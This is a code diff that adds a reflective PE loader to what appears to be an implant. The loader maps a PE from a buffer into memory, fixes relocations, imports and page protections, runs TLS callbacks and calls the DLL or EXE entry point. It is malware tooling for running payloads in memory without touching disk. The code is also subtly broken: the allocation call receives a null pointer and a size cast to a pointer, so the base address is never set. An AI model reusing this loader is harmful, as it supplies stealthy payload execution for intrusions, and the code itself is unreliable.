@@ -69,7 +69,7 @@ auto DECLFN LoadEssentials(INSTANCE* Instance)->VOID {
 }
 
 // Alloc virtual memory for PE
-auto DECLFN AllocVm( HANDLE Handle, PVOID* Address, SIZE_T ZeroBit, SIZE_T* Size, ULONG AllocType, ULONG Protection ) -> NTSTATUS {
+auto DECLFN AllocVm( PVOID* Address, SIZE_T ZeroBit, SIZE_T* Size, ULONG AllocType, ULONG Protection ) -> NTSTATUS {
 	G_INSTANCE
 
 	if ( ! Instance->Ctx.IsSpoof ) { 
@@ -84,7 +84,7 @@ auto DECLFN AllocVm( HANDLE Handle, PVOID* Address, SIZE_T ZeroBit, SIZE_T* Size
 }
 
 // define memory protections
-auto DECLFN ProtVm( HANDLE Handle, PVOID* Address, SIZE_T* Size, ULONG NewProt, ULONG* OldProt ) -> NTSTATUS {
+auto DECLFN ProtVm( PVOID* Address, SIZE_T* Size, ULONG NewProt, ULONG* OldProt ) -> NTSTATUS {
 	G_INSTANCE
 
 	if ( ! Instance->Ctx.IsSpoof ) {
@@ -93,7 +93,6 @@ auto DECLFN ProtVm( HANDLE Handle, PVOID* Address, SIZE_T* Size, ULONG NewProt, 
 
 	return ( Instance->Win32.NtProtectVirtualMemory( NtCurrentProcess(), Address, Size, NewProt, OldProt ) );
 }
-
 
 auto DECLFN FixTls(
 	_In_ PVOID Base,
@@ -184,6 +183,7 @@ auto DECLFN FixImp(
 	return TRUE;
 }
 
+// Fix relocations
 auto DECLFN FixRel(
 	_In_ PVOID Base,
 	_In_ UPTR  Delta,
@@ -221,14 +221,51 @@ auto DECLFN FixRel(
 	return;
 }
 
+auto DECLFN FixMemPermissions(ULONG_PTR PeBaseAddr, IMAGE_NT_HEADERS* Header, IMAGE_SECTION_HEADER* SecHeader) -> VOID {
+	G_INSTANCE
+	for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
+		ULONG OldProt = NULL;
+		ULONG NewProt = 0;
+		ULONG SecChar = SecHeader[i].Characteristics;
+		if ( SecChar & IMAGE_SCN_MEM_EXECUTE ) {
+			if ( SecChar & IMAGE_SCN_MEM_WRITE ) {
+				NewProt = PAGE_EXECUTE_READWRITE;
+			} else if ( SecChar & IMAGE_SCN_MEM_READ ) {
+				NewProt = PAGE_EXECUTE_READ;
+			} else {
+				NewProt = PAGE_EXECUTE;
+			}
+		} else {
+			if ( SecChar & IMAGE_SCN_MEM_WRITE ) {
+				NewProt = PAGE_READWRITE;
+			} else if ( SecChar & IMAGE_SCN_MEM_READ ) {
+				NewProt = PAGE_READONLY;
+			} else {
+				NewProt = PAGE_NOACCESS;
+			}
+		}
+		ProtVm( 
+			( PVOID* )( PeBaseAddr + SecHeader[i].VirtualAddress ), 
+			( SIZE_T* )( SecHeader[i].Misc.VirtualSize ), 
+			NewProt, 
+			&OldProt 
+		);
+	}
+}
+
 auto DECLFN Reflect( BYTE* Buffer, ULONG Size, WCHAR* Arguments ) {
 
 	G_INSTANCE
 
+	PVOID pEntryPoint = NULL;
+
 	if ( *(ULONG*)( Buffer ) != 0x5A4D ) {
 		return FALSE;
 	}
+	ULONG oldProt = NULL;
+	BYTE* PeBaseAddr = nullptr;
 
+	// Parse PE headers
 	IMAGE_NT_HEADERS*     Header    = (IMAGE_NT_HEADERS*)( Buffer + ( (IMAGE_DOS_HEADER*)Buffer )->e_lfanew );
 	IMAGE_SECTION_HEADER* SecHeader = IMAGE_FIRST_SECTION( Header );
 	IMAGE_DATA_DIRECTORY* ExportDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
@@ -236,6 +273,52 @@ auto DECLFN Reflect( BYTE* Buffer, ULONG Size, WCHAR* Arguments ) {
 	IMAGE_DATA_DIRECTORY* ExceptDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
 	IMAGE_DATA_DIRECTORY* TlsDir    = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
 	IMAGE_DATA_DIRECTORY* RelocDir  = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+
+	// Allocate memory for PE
+	AllocVm((PVOID*)PeBaseAddr, 0, (SIZE_T*)Size, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
+
+	// Copy PE headers
+	for(int i=0; i < Header->FileHeader.NumberOfSections; i++) {
+		Mem::Copy(
+			(PVOID)(PeBaseAddr + SecHeader[i].VirtualAddress),
+			(PVOID)(Buffer + SecHeader[i].PointerToRawData),
+			SecHeader[i].SizeOfRawData
+		);
+	}
+
+	// Fix relocations
+	ULONG_PTR Delta = (ULONG_PTR)(PeBaseAddr)-Header->OptionalHeader.ImageBase;
+	FixRel(PeBaseAddr, Delta, RelocDir);
+
+	// Fix IAT
+	if (!FixImp(PeBaseAddr, ImportDir)) {
+		return FALSE;
+	}
+
+	// Fix memory permissions
+	FixMemPermissions((ULONG_PTR)PeBaseAddr, Header, SecHeader);
+
+	BOOL isDllFile = (Header->FileHeader.Characteristics & IMAGE_FILE_DLL) ? TRUE : FALSE;
+
+	// Set Exception handlers
+	FixExp(PeBaseAddr, ExceptDir);
+
+	// Call TLS callbacks
+	FixTls(PeBaseAddr, TlsDir);
+
+	pEntryPoint = (PVOID)(PeBaseAddr + Header->OptionalHeader.AddressOfEntryPoint);
+	if (isDllFile)
+	{
+		typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);
+		((DLLMAIN)pEntryPoint)((HINSTANCE)PeBaseAddr, DLL_PROCESS_ATTACH, NULL);
+	}
+	else
+	{
+		typedef BOOL(WINAPI* MAIN)();
+		return ((MAIN)pEntryPoint)();
+	}
+	// Chnage memory protections from RW -> RX
+	//ProtVm(PeBaseAddr, Size, PAGE_EXECUTE_READ, &oldProt);
 }
 
 EXTERN_C
@@ -265,6 +348,7 @@ auto DECLFN Entry( PVOID Parameter ) -> VOID {
 
 	WCHAR wArguments[MAX_PATH * 2] = { 0 };
 	Str::CharToWChar(wArguments, Arguments, ArgumentsL);
+	
 	ULONG Result = Reflect(Buffer, Length, wArguments);
 
 	Parser::Destroy(&Psr);
